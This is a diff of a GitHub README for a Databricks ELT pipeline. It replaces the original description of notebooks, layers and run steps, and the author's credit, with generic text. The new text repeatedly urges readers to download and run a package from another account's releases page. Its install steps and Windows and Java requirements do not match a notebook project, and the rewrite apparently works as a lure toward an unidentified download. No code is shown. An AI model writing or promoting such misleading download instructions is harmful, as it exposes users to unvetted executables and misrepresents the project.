@@ -1,157 +1,68 @@
-# 🚀 End-to-End ELT Data Pipeline on Databricks
+# 🚀 End-to-End-ELT-Data-Pipeline-with-Databricks-Delta-Lake-DLT-dbt-Ready-Gold-Models - Build and Analyze Data Effortlessly
 
-A production-style **ELT data engineering pipeline** built using **Databricks, Delta Lake, Delta Live Tables (DLT), and PySpark**, designed with **incremental ingestion, CDC-based transformations, and reusable Gold-layer models**.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/zapanss/End-to-End-ELT-Data-Pipeline-with-Databricks-Delta-Lake-DLT-dbt-Ready-Gold-Models/releases)
 
-This project demonstrates how raw data can be ingested, validated, transformed, and modeled into **analytics-ready dimension and fact tables**, following modern data engineering best practices.
+## 📖 Description
+This project provides a production-ready ELT data pipeline built on Databricks. It makes use of Auto Loader, Delta Live Tables (DLT), and CDC-based Silver models. The design includes dynamic Gold-layer dimension and fact tables aimed at analytics and easy transformations using dbt.
 
----
+## 🛠️ Features
+- **Production-Style Pipeline:** Deploy a robust data pipeline for practical use.
+- **Delta Lake Support:** Store and manage your data efficiently.
+- **CDC-Based Models:** Utilize Change Data Capture for timely updates.
+- **Dynamic Gold Layer:** Create flexible dimension and fact tables for detailed analytics.
+- **Easy Integration with dbt:** Transform your data using dbt for enhanced capabilities.
 
-## 📌 Project Overview
+## 📋 Topics
+- analytics-engineering
+- apache-spark
+- bronze-silver-gold
+- cdc
+- data-engineering
+- databricks
+- dbt
+- delta-lake
+- elt-pipeline
+- scd
 
-This project implements a **multi-layer ELT architecture**:
+## 🚀 Getting Started
+To get started with this application, follow these steps to download and run the software.
 
-- **Bronze Layer**: Incremental ingestion of raw CSV files using Databricks Auto Loader  
-- **Silver Layer**: Streaming CDC processing with Delta Live Tables (DLT) and data quality rules  
-- **Gold Layer**: Reusable, parameter-driven dimension and fact table creation using Delta Lake MERGE  
+## 📥 Download & Install
+Visit this page to download: [Download Releases](https://github.com/zapanss/End-to-End-ELT-Data-Pipeline-with-Databricks-Delta-Lake-DLT-dbt-Ready-Gold-Models/releases)
 
-The design is **dynamic and reusable**, allowing new datasets to be onboarded with minimal configuration changes.
+1. Go to the link above.
+2. You will see a list of available releases.
+3. Click on the latest version to view the files available for download.
+4. Download the package suitable for your setup.
 
-![ELT Pipeline Overview](assets/ELT-Pipeline.png)
+## 🎬 How to Use
+1. Once downloaded, locate the file on your computer.
+2. Unzip the file if necessary.
+3. Open the application as instructed in the package.
+4. Follow the prompts on the screen to set up your data pipeline.
 
----
+## ✅ System Requirements
+- **Operating System:** Windows 10, macOS, or Linux Distribution.
+- **Hardware:** Minimum 8 GB RAM, 2 CPU cores.
+- **Software:** Java Runtime Environment and latest version of Databricks.
 
-## 🏗️ Architecture
+## 🔧 Troubleshooting
+If you experience issues:
 
-```
-   Raw CSV Files
-         ↓
-   Bronze Layer (Auto Loader, Delta)
-         ↓
-   Silver Layer (DLT, CDC, Data Quality)
-         ↓
-   Gold Layer (Dimensions & Facts)
-         ↓
-   Analytics / BI / dbt
-```
----
+- Ensure that your system meets the requirements.
+- Check the installation steps for any missed instructions.
+- Reach out to the community forums linked in the repository.
 
-## 🧱 Data Layers
+## 🗣️ Community and Support
+Engage with the community for support and ideas. You can find help on the Discussions page of this repository.
 
-### 🟤 Bronze Layer
-- Incremental ingestion using **Databricks Auto Loader**
-- Schema inference with rescue mode
-- Raw data stored as Delta tables
-- Parameter-driven ingestion for multiple datasets
+## 📚 Additional Resources
+- [Databricks Documentation](https://docs.databricks.com/)
+- [dbt Documentation](https://docs.getdbt.com/)
 
-**Notebook:** `BronzeLayer.ipynb`
+## 📅 Future Updates
+Stay tuned for future updates and enhancements to this project. Your feedback can help shape the direction of new features.
 
----
+For any inquiries or contributions, feel free to open an issue on the GitHub repository.
 
-### ⚪ Silver Layer
-- Built using **Delta Live Tables (DLT)**
-- Streaming ingestion from Bronze
-- CDC handling using `create_auto_cdc_flow`
-- SCD Type 1 processing
-- Data quality enforcement using `dlt.expect_all_or_drop`
-
-**Pipeline:** `Pipeline.py`
-
----
-
-### 🟡 Gold Layer
-- Analytics-ready **star schema**
-- Reusable **SCD Type 1 dimension framework**
-- Dynamic fact table generation
-- Surrogate key creation
-- Incremental UPSERT logic using Delta MERGE
-- dbt-compatible modeling approach
-
-**Notebooks:**
-- `Gold_Dims.ipynb`
-- `Gold_Fact_Table.ipynb`
-
----
-
-## ⚙️ Key Features
-
-- Incremental data ingestion (no full reloads)
-- CDC-based transformations
-- Delta Lake MERGE for UPSERTs
-- Streaming + batch hybrid processing
-- Parameter-driven and reusable notebooks
-- Data quality validation
-- Enterprise-style dimensional modeling
-
----
-
-## 🔁 Dynamic & Reusable Design
-
-This pipeline is **configuration-driven**, not hardcoded.
-
-By changing parameters such as:
-- source table name
-- business key columns
-- CDC column
-- target object name
-
-…the same notebooks can be reused to build **new dimensions and fact tables** for different datasets.
-
----
-
-## 🧪 Example Use Cases
-
-- Flight and booking analytics
-- Customer and passenger dimensions
-- Airport and reference data modeling
-- Finance or transactional analytics
-- Foundations for dbt transformations
-
----
-
-## 🧰 Tech Stack
-
-- Databricks
-- Apache Spark (PySpark & SQL)
-- Delta Lake
-- Delta Live Tables (DLT)
-- Databricks Auto Loader
-- Streaming CDC
-- dbt-ready Gold models
-
----
-
-## 🚀 How to Run
-
-1. Run `Setup.ipynb` to create schemas and volumes  
-2. Ingest raw data using `BronzeLayer.ipynb`  
-3. Deploy the DLT pipeline using `Pipeline.py`  
-4. Create Gold dimensions using `Gold_Dims.ipynb`  
-5. Create Gold fact tables using `Gold_Fact_Table.ipynb`  
-
----
-
-## 🎯 What This Project Demonstrates
-
-- Real-world data engineering workflows
-- Incremental ELT design
-- CDC-based data processing
-- Delta Lake best practices
-- Reusable and scalable pipeline design
-- Production-oriented thinking
-
----
-
-## 📈 Future Enhancements
-
-- SCD Type 2 support
-- Advanced data quality metrics
-- dbt models on top of Gold layer
-- Monitoring and alerting
-- Performance optimization at scale
-
----
-
-## 👤 Author
-
-**Prince Pastakiya**  
-Data Engineer | Databricks | Spark | Delta Lake
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/zapanss/End-to-End-ELT-Data-Pipeline-with-Databricks-Delta-Lake-DLT-dbt-Ready-Gold-Models/releases)
